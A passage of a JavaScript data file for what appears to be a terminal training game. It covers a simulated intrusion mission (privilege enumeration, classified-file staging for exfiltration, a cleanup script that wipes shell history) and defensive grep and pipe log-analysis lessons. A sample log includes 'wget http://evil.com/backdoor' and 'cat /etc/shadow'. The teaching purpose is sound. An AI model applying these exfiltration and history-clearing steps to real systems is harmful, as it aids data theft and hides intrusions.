                '/home/ghost/tools/privesc_check.sh': {
                    type: 'file', perms: '-rwxr-xr-x', owner: 'ghost', group: 'ghost', size: 512,
                    content: `#!/bin/bash
# privesc_check.sh - Privilege escalation enumeration
echo "[*] Privilege Escalation Check"
echo "=============================="
echo ""
echo "[+] SUID Binaries:"
find / -perm -4000 -type f 2>/dev/null
echo ""
echo "[+] Sudo capabilities:"
sudo -l 2>/dev/null
echo ""
echo "[+] Writable directories:"
find / -writable -type d 2>/dev/null | head -10
echo ""
echo "[+] Interesting files in /data:"
ls -la /data/ 2>/dev/null
echo ""
echo "[*] Check complete"
`
                },
                '/home/ghost/tools/exfil.sh': {
                    type: 'file', perms: '-rwxr-xr-x', owner: 'ghost', group: 'ghost', size: 384,
                    content: `#!/bin/bash
# exfil.sh - Data exfiltration helper
if [ -z "$1" ]; then
    echo "Usage: ./exfil.sh <source_dir>"
    echo "Packages directory and stages for extraction"
    exit 1
fi
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
PACKAGE="staging/chimera_intel_$TIMESTAMP.tar.gz"
tar -czf "$PACKAGE" "$1" 2>/dev/null
echo "[+] Package created: $PACKAGE"
echo "[+] Size: $(du -h $PACKAGE | cut -f1)"
echo "[+] Ready for exfiltration to handler"
`
                },
                '/home/ghost/tools/cleanup.sh': {
                    type: 'file', perms: '-rwxr-xr-x', owner: 'ghost', group: 'ghost', size: 256,
                    content: `#!/bin/bash
# cleanup.sh - Post-operation cleanup
echo "[*] Initiating cleanup..."
rm -rf staging/*
history -c
echo "" > ~/.bash_history
echo "[+] Staging cleared"
echo "[+] History cleared"
echo "[*] Ghost protocol complete"
`
                },
                '/home/ghost/staging': {
                    type: 'dir', perms: 'drwx------', owner: 'ghost', group: 'ghost',
                    children: ['README.txt']
                },
                '/home/ghost/staging/README.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'ghost', group: 'ghost', size: 256,
                    content: `STAGING DIRECTORY
=================
Use this directory to prepare intelligence packages.

Commands:
  tar -czf staging/intel.tar.gz /data/classified/

Then use exfil.sh or manual SCP to handler.
`
                },
                '/home/ghost/recon': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'ghost', group: 'ghost',
                    children: ['network_map.txt', 'user_list.txt']
                },
                '/home/ghost/recon/network_map.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'ghost', group: 'ghost', size: 384,
                    content: `CHIMERA NETWORK MAP (PARTIAL)
=============================
Gathered during initial reconnaissance

10.0.0.1    - Handler (SPECTER-1)
10.0.0.42   - Internal server
10.0.0.100  - Database server
10.0.0.200  - File server (classified data)

CHIMERA host (you are here):
  - IP: 10.0.0.50
  - Role: Workstation
  - Access: User-level
`
                },
                '/home/ghost/recon/user_list.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'ghost', group: 'ghost', size: 256,
                    content: `ENUMERATED USERS
================
root - System administrator
ghost - Current access (you)
admin - IT administrator
chimera - Service account
backup - Backup service

Note: "admin" has sudo privileges
`
                },
                '/data': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
                    children: ['classified', 'public', 'backups']
                },
                '/data/public': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
                    children: ['company_info.txt']
                },
                '/data/public/company_info.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 256,
                    content: `Chimera Holdings Inc.
=====================
Founded: 2015
Industry: Defense Contracting
Classification: See /data/classified for project details
`
                },
                '/data/backups': {
                    type: 'dir', perms: 'drwx------', owner: 'backup', group: 'backup',
                    children: ['db_backup.sql.gz']
                },
                '/data/classified': {
                    type: 'dir', perms: 'drwxr-x---', owner: 'root', group: 'classified',
                    children: ['project_chimera.pdf', 'asset_network.xlsx', 'operational_plans.docx', 'verification_codes.txt']
                },
                '/data/classified/project_chimera.pdf': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'classified', size: 5242880,
                    content: `[TOP SECRET//CHIMERA//NOFORN]

PROJECT CHIMERA - Executive Summary
===================================

Project Status: ACTIVE
Budget: $50M USD
Timeline: 2024-2027

Key Personnel:
- Director: [REDACTED]
- Lead Engineer: [REDACTED]

Objectives:
1. Develop advanced autonomous systems
2. Integrate AI decision-making
3. Deploy to theater operations

VERIFICATION CODE: PHOENIX-7

This code confirms successful access to classified materials.
Report to handler upon discovery.

[END CLASSIFIED SECTION]
`
                },
                '/data/classified/asset_network.xlsx': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'classified', size: 1048576,
                    content: '[CLASSIFIED - Asset network diagram and personnel locations]'
                },
                '/data/classified/operational_plans.docx': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'classified', size: 2097152,
                    content: '[CLASSIFIED - Q1 2026 operational deployment plans]'
                },
                '/data/classified/verification_codes.txt': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'classified', size: 256,
                    content: `VERIFICATION CODES - DESTROY AFTER READING
==========================================
Mission Verification: PHOENIX-7
Abort Code: BLACKOUT-ZERO
Handler Confirmation: SPECTER-ALPHA

Use PHOENIX-7 to confirm successful data access.
`
                },
                '/var/log': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
                    children: ['auth.log', 'syslog', 'secure', 'access.log']
                },
                '/var/log/auth.log': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'adm', size: 4096,
                    content: `Jan 17 02:55:00 CHIMERA sshd[1234]: Connection from 10.0.0.1 port 55432
Jan 17 02:55:01 CHIMERA sshd[1234]: Accepted publickey for ghost from 10.0.0.1 port 55432
Jan 17 02:55:01 CHIMERA sshd[1234]: pam_unix(sshd:session): session opened for user ghost
Jan 17 03:00:15 CHIMERA sudo: ghost : TTY=pts/0 ; PWD=/home/ghost ; USER=root ; COMMAND=/bin/cat /etc/shadow
Jan 17 03:05:00 CHIMERA sshd[1234]: Received disconnect from 10.0.0.1: disconnected by user
`
                },
                '/var/log/syslog': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'adm', size: 2048,
                    content: `Jan 17 00:00:00 CHIMERA systemd[1]: Starting Daily apt activities...
Jan 17 00:00:01 CHIMERA systemd[1]: Started Daily apt activities.
Jan 17 02:55:00 CHIMERA systemd[1]: Started Session 42 of user ghost.
`
                },
                '/var/log/secure': {
                    type: 'file', perms: '-rw-------', owner: 'root', group: 'root', size: 1024,
                    content: `Jan 17 02:55:01 CHIMERA sshd[1234]: pam_unix(sshd:auth): authentication success; user=ghost
`
                },
                '/var/log/access.log': {
                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 512,
                    content: `10.0.0.1 - ghost [17/Jan/2026:02:55:01] "SSH LOGIN" 200
10.0.0.50 - admin [17/Jan/2026:01:30:00] "SSH LOGIN" 200
`
                },
                '/etc/passwd': {
                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 512,
                    content: `root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
ghost:x:1000:1000:Ghost Operator:/home/ghost:/bin/bash
admin:x:1001:1001:IT Admin:/home/admin:/bin/bash
chimera:x:999:999:Chimera Service:/var/chimera:/usr/sbin/nologin
backup:x:998:998:Backup Service:/var/backups:/usr/sbin/nologin
`
                },
            },

            objectives: [
                { id: 1, task: 'RECON: Survey Environment', hint: 'whoami && pwd && ls -la', check: (cmd, state, output) => (cmd.includes('ls') && (output && output.includes('mission'))) || (cmd.includes('whoami') && output && output.includes('ghost')) },
                { id: 2, task: 'INTEL: Read Mission Briefing', hint: '$ cat mission/briefing.txt', check: (cmd, state, output) => cmd.includes('cat') && output && (output.includes('CHIMERA') || output.includes('PHOENIX')) },
                { id: 3, task: 'ANALYZE: Check Privesc Paths', hint: '$ find / -perm -4000 or check tools', check: (cmd, state, output) => (cmd.includes('find') && cmd.includes('-perm')) || (cmd.includes('privesc') || cmd.includes('sudo')) },
                { id: 4, task: 'DISCOVER: Locate Classified Data', hint: '$ cat /data/classified/project_chimera.pdf', check: (cmd, state, output) => output && (output.includes('PHOENIX-7') || output.includes('VERIFICATION CODE')) },
                { id: 5, task: 'EXFIL: Stage Intel Package', hint: '$ tar -czf staging/intel.tar.gz /data/classified/', check: (cmd, state, output) => cmd.includes('tar') && cmd.includes('staging') },
            ],

            insightPhase: {
                enabled: true,
                question: "What is the mission verification code found in the classified documents?",
                acceptedAnswers: ["PHOENIX-7", "phoenix-7", "PHOENIX7"],
                hint: "Read the project_chimera.pdf or verification_codes.txt in /data/classified/",
                hintAfterAttempts: 3
            },

            remoteHosts: null,
        },

        // ══════════════════════════════════════════════════════════════════════════
        // GREP & PIPE MASTERY - SPECIAL OPERATIONS COURSE
        // These modules are standalone (not part of CLH tier progression)
        // ══════════════════════════════════════════════════════════════════════════

        // ──────────────────────────────────────────────────────────
        // GPM-001: Grep Fundamentals
        // Theme: Pattern hunting with grep flags
        // ──────────────────────────────────────────────────────────
        'GPM-001': {
            title: 'Grep Fundamentals',
            description: 'Master grep flags for security log analysis. Hunt patterns like a pro.',
            prerequisites: [],
            tier: null, // Special course - not in tier progression
            user: 'analyst',
            hostname: 'logserver',
            startDir: '/var/log',
            allowedCommands: null,

            filesystem: {
                '/var/log': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
                    children: ['auth.log', 'syslog', 'access.log', 'error.log', 'secure.log', 'configs']
                },
                '/var/log/auth.log': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'adm', size: 2048,
                    content: `Jan 15 02:14:33 server sshd[1234]: Failed password for root from 192.168.1.105 port 44521 ssh2
Jan 15 02:14:35 server sshd[1234]: Failed password for root from 192.168.1.105 port 44522 ssh2
Jan 15 02:14:38 server sshd[1234]: Failed password for admin from 192.168.1.105 port 44523 ssh2
Jan 15 02:15:01 server sshd[1235]: Accepted password for admin from 10.0.0.5 port 55123 ssh2
Jan 15 02:15:22 server sshd[1236]: Failed password for root from 192.168.1.105 port 44524 ssh2
Jan 15 02:15:45 server sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash
Jan 15 02:16:01 server sshd[1237]: Failed password for root from 192.168.1.105 port 44525 ssh2
Jan 15 02:16:33 server sshd[1238]: Failed password for administrator from 192.168.1.105 port 44526 ssh2
Jan 15 03:00:00 server CRON[2001]: (root) CMD (/usr/bin/backup.sh)
Jan 15 03:14:22 server sshd[1239]: Failed password for root from 192.168.1.105 port 44601 ssh2`
                },
                '/var/log/syslog': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'adm', size: 1536,
                    content: `Jan 15 02:00:00 server kernel: Linux version 5.15.0
Jan 15 02:14:30 server sshd[1234]: error: PAM: Authentication failure for root
Jan 15 02:14:33 server sshd[1234]: error: maximum authentication attempts exceeded
Jan 15 02:15:00 server kernel: WARNING: possible SYN flood attack
Jan 15 02:15:45 server sudo[1500]: admin : command not allowed
Jan 15 02:16:00 server kernel: ERROR: disk space critical on /var
Jan 15 03:00:00 server backup: INFO: backup started
Jan 15 03:05:00 server backup: INFO: backup completed successfully`
                },
                '/var/log/access.log': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'adm', size: 1024,
                    content: `192.168.1.105 - - [15/Jan:02:14:30] "GET /admin HTTP/1.1" 401
192.168.1.105 - - [15/Jan:02:14:35] "POST /login HTTP/1.1" 401
10.0.0.5 - - [15/Jan:02:15:01] "GET /dashboard HTTP/1.1" 200
192.168.1.105 - - [15/Jan:02:16:00] "GET /admin HTTP/1.1" 403
172.16.0.50 - - [15/Jan:02:20:00] "GET /index.html HTTP/1.1" 200
192.168.1.105 - - [15/Jan:02:25:00] "GET /wp-admin HTTP/1.1" 404`
                },
                '/var/log/error.log': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'adm', size: 768,
                    content: `[ERROR] 02:14:33 Authentication failed for user root
[ERROR] 02:14:35 Authentication failed for user root
[WARNING] 02:15:00 Multiple failed login attempts detected
[CRITICAL] 02:16:00 Disk space below threshold
[ERROR] 02:16:33 Authentication failed for user administrator
[INFO] 03:00:00 Scheduled backup initiated`
                },
                '/var/log/secure.log': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'adm', size: 512,
                    content: `Jan 15 02:14:33 sshd: pam_unix(sshd:auth): authentication failure; user=root rhost=192.168.1.105
Jan 15 02:15:01 sshd: pam_unix(sshd:session): session opened for user admin
Jan 15 02:15:45 sudo: admin : user NOT in sudoers
Jan 15 02:16:01 sshd: pam_unix(sshd:auth): authentication failure; user=root rhost=192.168.1.105`
                },
                '/var/log/configs': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
                    children: ['ssh.conf', 'apache.conf', 'mysql.conf']
                },
                '/var/log/configs/ssh.conf': {
                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 256,
                    content: `# SSH Configuration
Port 22
PermitRootLogin no
PasswordAuthentication yes
MaxAuthTries 6`
                },
                '/var/log/configs/apache.conf': {
                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 256,
                    content: `# Apache Configuration
ServerRoot "/etc/apache2"
Listen 80
# password: admin123 (REMOVE BEFORE PRODUCTION)`
                },
                '/var/log/configs/mysql.conf': {
                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 128,
                    content: `[mysqld]
datadir=/var/lib/mysql
socket=/var/lib/mysql/mysql.sock`
                }
            },

            objectives: [
                {
                    id: 1,
                    task: 'Find "error" entries (case-insensitive)',
                    hint: 'Use -i flag: grep -i "error" filename',
                    check: (cmd, state, output) => {
                        return cmd.includes('grep') && cmd.includes('-i') &&
                               (cmd.toLowerCase().includes('error') || output);
                    }
                },
                {
                    id: 2,
                    task: 'Count failed login attempts',
                    hint: 'Use -c flag: grep -c "failed" auth.log',
                    check: (cmd, state, output) => {
                        return cmd.includes('grep') && cmd.includes('-c') &&
                               cmd.toLowerCase().includes('failed');
                    }
                },
                {
                    id: 3,
                    task: 'Show "root" matches with line numbers',
                    hint: 'Use -n flag: grep -n "root" filename',
                    check: (cmd, state, output) => {
                        return cmd.includes('grep') && cmd.includes('-n') &&
                               cmd.includes('root');
                    }
                },
                {
                    id: 4,
                    task: 'Find lines NOT containing "failed" (successful)',
                    hint: 'Use -v flag to invert match: grep -v "failed" auth.log',
                    check: (cmd, state, output) => {
                        return cmd.includes('grep') && cmd.includes('-v');
                    }
                },
                {
                    id: 5,
                    task: 'Search recursively for "password"',
                    hint: 'Use -r flag: grep -r "password" /var/log/',
                    check: (cmd, state, output) => {
                        return cmd.includes('grep') && cmd.includes('-r') &&
                               cmd.toLowerCase().includes('password');
                    }
                },
                {
                    id: 6,
                    task: 'Get context around a critical event',
                    hint: 'Use -A, -B, or -C flags: grep -C 2 "CRITICAL" error.log',
                    check: (cmd, state, output) => {
                        const lowerCmd = cmd.toLowerCase();
                        return cmd.includes('grep') && /-[abc]\s*\d/.test(lowerCmd);
                    }
                },
                {
                    id: 7,
                    task: 'List files containing "ssh"',
                    hint: 'Use -l flag: grep -rl "ssh" /var/log/',
                    check: (cmd, state, output) => {
                        return cmd.includes('grep') && cmd.includes('-l');
                    }
                },
                {
                    id: 8,
                    task: 'Match whole word "admin" only',
                    hint: 'Use -w flag: grep -w "admin" auth.log',
                    check: (cmd, state, output) => {
                        return cmd.includes('grep') && cmd.includes('-w') &&
                               cmd.includes('admin');
                    }
                }
            ]
        },

        // ──────────────────────────────────────────────────────────
        // GPM-002: Regex Power
        // Theme: Regular expressions for pattern matching
        // ──────────────────────────────────────────────────────────
        'GPM-002': {
            title: 'Regex Power',
            description: 'Unlock pattern-matching superpowers with regular expressions.',
            prerequisites: ['GPM-001'],
            tier: null,
            user: 'analyst',
            hostname: 'intelserver',
            startDir: '/data/intel',
            allowedCommands: null,

            filesystem: {
                '/data/intel': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'analyst', group: 'analyst',
                    children: ['network.log', 'users.txt', 'connections.log', 'alerts.log']
                },
                '/data/intel/network.log': {
                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 1024,
                    content: `2024-01-15 02:14:33 TCP 192.168.1.105:44521 -> 10.0.0.5:22 SYN
2024-01-15 02:14:35 TCP 192.168.1.105:44522 -> 10.0.0.5:22 SYN
2024-01-15 02:15:01 TCP 10.0.0.88:55123 -> 10.0.0.5:22 ESTABLISHED
2024-01-15 02:15:22 TCP 192.168.1.105:44523 -> 10.0.0.5:22 RST
2024-01-15 02:16:00 UDP 8.8.8.8:53 -> 10.0.0.5:44444 DNS
2024-01-15 02:16:33 TCP 192.168.1.105:44524 -> 10.0.0.5:22 SYN`
                },
                '/data/intel/users.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 768,
                    content: `admin:x:1000:1000:Admin User:/home/admin:/bin/bash
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
user1@company.com:active:developer
user2@company.com:active:analyst
admin@evil.com:suspicious:unknown
test@test.org:inactive:tester`
                },
                '/data/intel/connections.log': {
                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 512,
                    content: `ESTABLISHED 192.168.1.105:44521 10.0.0.5:22 ssh denied
ESTABLISHED 192.168.1.105:44522 10.0.0.5:22 ssh denied
ESTABLISHED 10.0.0.88:55123 10.0.0.5:22 ssh authorized
CLOSED 192.168.1.105:44523 10.0.0.5:22 ssh denied
TIME_WAIT 172.16.0.50:8080 10.0.0.5:80 http authorized
ESTABLISHED 192.168.1.105:44524 10.0.0.5:22 ssh denied`
                },
                '/data/intel/alerts.log': {
                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 640,
                    content: `2024-01-15 02:14:33 ALERT: Unauthorized access attempt from 192.168.1.105
2024-01-15 02:15:00 WARNING: Multiple failed authentications
2024-01-15 02:15:22 ALERT: Brute force pattern detected
2024-01-15 02:16:00 ERROR: Connection rate limit exceeded
2024-01-15 02:16:33 CRITICAL: Security breach suspected
fff failed failed failed
aaa unauthorized unauthorized unauthorized unauthorized`
                }
            },

            objectives: [
                {
                    id: 1,
                    task: 'Find lines starting with a date (2024)',
                    hint: 'Use ^ anchor: grep "^2024" filename',
                    check: (cmd, state, output) => {
                        return cmd.includes('grep') && cmd.includes('^');
                    }
                },
                {
                    id: 2,
                    task: 'Extract all IP addresses',
                    hint: 'Use -Eo with digit pattern: grep -Eo "[0-9]+\\.[0-9]+" network.log',
                    check: (cmd, state, output) => {
                        const lowerCmd = cmd.toLowerCase();
                        return cmd.includes('grep') && lowerCmd.includes('-o') &&
                               (lowerCmd.includes('-e') || lowerCmd.includes('[0-9]'));
                    }
                },
                {
                    id: 3,
                    task: 'Find error OR warning messages',
                    hint: 'Use | operator with -E: grep -E "error|warning" alerts.log',
                    check: (cmd, state, output) => {
                        return cmd.includes('grep') && cmd.includes('|') &&
                               (cmd.includes('-E') || cmd.includes('-e'));
                    }
                },
                {
                    id: 4,
                    task: 'Match port numbers (:[0-9]+)',
                    hint: 'Use digit range: grep -E ":[0-9]+" network.log',
                    check: (cmd, state, output) => {
                        return cmd.includes('grep') && cmd.includes(':[0-9]');
                    }
                },
                {
                    id: 5,
                    task: 'Find lines ending with "denied"',
                    hint: 'Use $ anchor: grep "denied$" connections.log',
                    check: (cmd, state, output) => {
                        return cmd.includes('grep') && cmd.includes('$');
                    }
                },
                {
                    id: 6,
                    task: 'Extract email addresses',
                    hint: 'Look for @ symbol pattern: grep -E "[^@]+@[^@]+" users.txt',
                    check: (cmd, state, output) => {
                        return cmd.includes('grep') && cmd.includes('@');
                    }
                },
                {
                    id: 7,
                    task: 'Find 3+ repeated words (e.g., failed)',
                    hint: 'Use {n,} quantifier: grep -E "(failed ){3,}" alerts.log',
                    check: (cmd, state, output) => {
                        return cmd.includes('grep') && cmd.includes('{');
                    }
                },
                {
                    id: 8,
                    task: 'Match optional pattern (un)?authorized',
                    hint: 'Use ? quantifier: grep -E "(un)?authorized" connections.log',
                    check: (cmd, state, output) => {
                        return cmd.includes('grep') && cmd.includes('?');
                    }
                }
            ]
        },

        // ──────────────────────────────────────────────────────────
        // GPM-003: Pipe Wizardry
        // Theme: Unix pipes and data transformation
        // ──────────────────────────────────────────────────────────
        'GPM-003': {
            title: 'Pipe Wizardry',
            description: 'Chain commands together with pipes to transform and analyze data.',
            prerequisites: ['GPM-002'],
            tier: null,
            user: 'analyst',
            hostname: 'forensics',
            startDir: '/forensics',
            allowedCommands: null,

            filesystem: {
                '/forensics': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'analyst', group: 'analyst',
                    children: ['access.log', 'auth.log', 'connections.log', 'ips.txt', 'reports']
                },
                '/forensics/access.log': {
                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 2048,
                    content: `192.168.1.105 GET /admin 401
192.168.1.105 POST /login 401
192.168.1.105 GET /admin 401
10.0.0.5 GET /dashboard 200
192.168.1.105 GET /admin 403
172.16.0.50 GET /index.html 200
192.168.1.105 GET /wp-admin 404
192.168.1.105 GET /admin 401
10.0.0.5 GET /api/users 200
192.168.1.105 POST /login 401
172.16.0.50 GET /about 200
192.168.1.105 GET /admin 401`
                },
                '/forensics/auth.log': {
                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 1536,
                    content: `Jan 15 02:14:33 Failed password for root from 192.168.1.105
Jan 15 02:14:35 Failed password for root from 192.168.1.105
Jan 15 02:14:38 Failed password for admin from 192.168.1.105
Jan 15 02:15:01 Accepted password for admin from 10.0.0.5
Jan 15 02:15:22 Failed password for root from 192.168.1.105
Jan 15 02:16:01 Failed password for root from 192.168.1.105
Jan 15 02:16:33 Failed password for administrator from 192.168.1.105
Jan 15 03:14:22 Failed password for root from 192.168.1.105`
                },
                '/forensics/connections.log': {
                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 768,
                    content: `192.168.1.105:22 DENIED
192.168.1.105:22 DENIED
10.0.0.5:22 ALLOWED
192.168.1.105:22 DENIED
172.16.0.50:80 ALLOWED
192.168.1.105:22 DENIED
192.168.1.105:22 DENIED
10.0.0.88:22 ALLOWED`
                },
                '/forensics/ips.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 256,
                    content: `192.168.1.105
192.168.1.105
10.0.0.5
192.168.1.105
172.16.0.50
192.168.1.105
10.0.0.5
192.168.1.105`
                },
                '/forensics/reports': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'analyst', group: 'analyst',
                    children: []
                }
            },

            objectives: [
                {
                    id: 1,
                    task: 'Count lines in grep output',
                    hint: 'Pipe to wc -l: grep "pattern" file | wc -l',
                    check: (cmd, state, output) => {
                        return cmd.includes('|') && cmd.includes('wc -l');
                    }
                },
                {
                    id: 2,
                    task: 'Sort grep results alphabetically',
                    hint: 'Pipe to sort: grep "pattern" file | sort',
                    check: (cmd, state, output) => {
                        return cmd.includes('|') && cmd.includes('sort');
                    }
                },
                {
                    id: 3,
                    task: 'Get unique values from data',
                    hint: 'Pipe through sort then uniq: cat file | sort | uniq',
                    check: (cmd, state, output) => {
                        return cmd.includes('|') && cmd.includes('uniq');
                    }
                },
                {
                    id: 4,
                    task: 'Count occurrences of each unique value',
                    hint: 'Use uniq -c: sort file | uniq -c',
                    check: (cmd, state, output) => {
                        return cmd.includes('|') && cmd.includes('uniq -c');
                    }
                },
                {
                    id: 5,
                    task: 'Find top 5 most frequent items',
                    hint: 'Chain: sort | uniq -c | sort -rn | head -5',
                    check: (cmd, state, output) => {
                        return (cmd.includes('sort -rn') || cmd.includes('sort -nr')) &&
                               cmd.includes('head');
                    }
                },
                {
                    id: 6,
                    task: 'Extract a specific field with cut',
                    hint: 'Use cut -d to split: cut -d" " -f1 file',
                    check: (cmd, state, output) => {
                        return cmd.includes('cut -d');
                    }
                },
                {
                    id: 7,
                    task: 'Build a 3+ stage pipeline',
                    hint: 'Chain multiple commands: cmd1 | cmd2 | cmd3',
                    check: (cmd, state, output) => {
                        const pipeCount = (cmd.match(/\|/g) || []).length;
                        return pipeCount >= 2;
                    }
                },
                {
                    id: 8,
                    task: 'Use tee to save AND display output',
                    hint: 'Use tee: grep "pattern" file | tee output.txt',
                    check: (cmd, state, output) => {
                        return cmd.includes('tee');
                    }
                }
            ]
        },

        // ──────────────────────────────────────────────────────────
        // GPM-BOSS: Incident Analysis
        // Theme: Boss challenge combining all skills
        // ──────────────────────────────────────────────────────────
        'GPM-BOSS': {
            title: 'INCIDENT ANALYSIS',
            description: 'Final challenge: Full incident analysis of a security breach using all techniques.',
            prerequisites: ['GPM-003'],
            tier: null,
            user: 'ir-analyst',
            hostname: 'evidence',
            startDir: '/evidence',
            allowedCommands: null,

            filesystem: {
                '/evidence': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'ir-analyst', group: 'ir-analyst',
                    children: ['auth.log', 'access.log', 'reports']
                },
                '/evidence/auth.log': {
                    type: 'file', perms: '-rw-r--r--', owner: 'ir-analyst', group: 'ir-analyst', size: 4096,
                    content: `Jan 15 02:00:00 server sshd[1000]: Server listening on port 22
Jan 15 02:14:33 server sshd[1234]: Failed password for root from 192.168.1.105 port 44521 ssh2
Jan 15 02:14:35 server sshd[1234]: Failed password for root from 192.168.1.105 port 44522 ssh2
Jan 15 02:14:38 server sshd[1234]: Failed password for root from 192.168.1.105 port 44523 ssh2
Jan 15 02:14:40 server sshd[1234]: Failed password for root from 192.168.1.105 port 44524 ssh2
Jan 15 02:14:43 server sshd[1234]: Failed password for root from 192.168.1.105 port 44525 ssh2
Jan 15 02:15:01 server sshd[1235]: Accepted password for admin from 10.0.0.5 port 55123 ssh2
Jan 15 02:15:22 server sshd[1236]: Failed password for root from 192.168.1.105 port 44526 ssh2
Jan 15 02:15:45 server sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash
Jan 15 02:16:01 server sshd[1237]: Failed password for root from 192.168.1.105 port 44527 ssh2
Jan 15 02:16:33 server sshd[1238]: Failed password for root from 192.168.1.105 port 44528 ssh2
Jan 15 02:17:00 server sshd[1239]: Failed password for root from 192.168.1.105 port 44529 ssh2
Jan 15 02:17:15 server sshd[1240]: Failed password for root from 192.168.1.105 port 44530 ssh2
Jan 15 02:17:30 server sshd[1241]: Failed password for root from 192.168.1.105 port 44531 ssh2
Jan 15 02:18:00 server sshd[1242]: Failed password for root from 192.168.1.105 port 44532 ssh2
Jan 15 02:30:00 server sshd[1243]: Accepted password for root from 192.168.1.105 port 44600 ssh2
Jan 15 02:30:15 server sudo: root : TTY=pts/1 ; COMMAND=/bin/cat /etc/shadow
Jan 15 02:31:00 server sudo: root : TTY=pts/1 ; COMMAND=/usr/bin/wget http://evil.com/backdoor
Jan 15 03:00:00 server CRON[2001]: (root) CMD (/usr/bin/backup.sh)
Jan 15 03:14:22 server sshd[2100]: Session closed for user root`
                },
                '/evidence/access.log': {
                    type: 'file', perms: '-rw-r--r--', owner: 'ir-analyst', group: 'ir-analyst', size: 2048,
                    content: `192.168.1.105 - - [15/Jan:02:14:30] "GET /admin HTTP/1.1" 401
192.168.1.105 - - [15/Jan:02:14:33] "POST /login HTTP/1.1" 401
192.168.1.105 - - [15/Jan:02:14:35] "POST /login HTTP/1.1" 401
192.168.1.105 - - [15/Jan:02:14:38] "POST /login HTTP/1.1" 401
10.0.0.5 - - [15/Jan:02:15:01] "GET /dashboard HTTP/1.1" 200
192.168.1.105 - - [15/Jan:02:15:22] "POST /login HTTP/1.1" 401
192.168.1.105 - - [15/Jan:02:16:00] "GET /admin HTTP/1.1" 403
192.168.1.105 - - [15/Jan:02:30:00] "GET /admin HTTP/1.1" 200
192.168.1.105 - - [15/Jan:02:30:30] "GET /api/users HTTP/1.1" 200
192.168.1.105 - - [15/Jan:02:31:00] "POST /api/exfil HTTP/1.1" 200`
                },
                '/evidence/reports': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'ir-analyst', group: 'ir-analyst',
                    children: []
                }
            },

            objectives: [
                {
                    id: 1,
                    task: 'Find the attacker IP (most failed logins)',
                    hint: 'Pipeline: grep failed | sort | uniq -c | sort -rn',
                    check: (cmd, state, output) => {
                        return cmd.includes('uniq -c') && cmd.includes('sort') &&
                               cmd.toLowerCase().includes('failed');
                    }
                },
                {
                    id: 2,
                    task: 'Count total failed attack attempts',
                    hint: 'Use grep -c: grep -c "Failed" auth.log',
                    check: (cmd, state, output) => {
                        return cmd.includes('grep') && cmd.includes('-c') &&
                               cmd.toLowerCase().includes('failed');
                    }
                },
                {
                    id: 3,
                    task: 'Find what user account was targeted',
                    hint: 'Search for "root" in the logs',
                    check: (cmd, state, output) => {
                        return cmd.includes('grep') && cmd.includes('root');
                    }
                },
                {
                    id: 4,
                    task: 'Check if any login succeeded for attacker',
                    hint: 'Search for "Accepted" in auth.log',
                    check: (cmd, state, output) => {
                        return cmd.includes('grep') &&
                               (cmd.toLowerCase().includes('accepted') || cmd.toLowerCase().includes('success'));
                    }
                },
                {
                    id: 5,
                    task: 'Extract the attack timeline (02:XX timestamps)',
                    hint: 'grep for the attack timeframe: grep "02:" auth.log',
                    check: (cmd, state, output) => {
                        return cmd.includes('grep') &&
                               (cmd.includes('02:') || cmd.includes('03:'));
                    }
                },
                {
                    id: 6,
                    task: 'Generate a summary report (save to file)',
                    hint: 'Use redirection > or tee: ... > report.txt',
                    check: (cmd, state, output) => {
                        return cmd.includes('>') || cmd.includes('tee');
                    }
                }
            ],

            insightPhase: {
                enabled: false
            }
        },

    };

